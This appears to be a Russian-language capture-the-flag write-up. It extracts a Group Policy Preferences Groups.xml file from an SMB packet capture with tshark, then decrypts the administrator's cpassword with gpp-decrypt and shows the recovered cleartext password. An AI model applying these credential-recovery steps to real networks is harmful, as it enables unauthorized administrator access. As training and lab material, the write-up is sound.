# GPO-Analysis

---

## Инструменты

- **Wireshark / tshark** – для анализа трафика.
- **gpp-decrypt** (из пакета `gpp-decrypt` в Kali) – для расшифровки.
- (Опционально) Python + `pycryptodome` – если `gpp-decrypt` недоступен.

---

## Ход выполнения

### 1. Поиск файла Groups.xml в дампе

Фильтруем SMB‑запросы на чтение файлов и извлекаем содержимое:

```bash
tshark -r gpo.pcap -Y "smb2.cmd == 8 || smb.cmd == 0x2e" -T fields -e data | xxd -r -p | strings | grep -i cpassword
Результат (фрагмент):

text
<Groups clsid="{...}">
  <User name="Helpdesk" ... cpassword="PsmtscOuXqUMW6KQzJR8RWxCuVNmBvRaDElCKH+FU+w" ... />
  <User name="Administrateur" ... cpassword="LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0" ... />
</Groups>
Вторая запись (Administrateur) – искомая учётная запись.

2. Расшифровка cpassword администратора
Используем утилиту gpp-decrypt:

bash
gpp-decrypt "LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0"
Вывод:

text
TuM0sTrouv3
Таким образом, пароль администратора: TuM0sTrouv3.
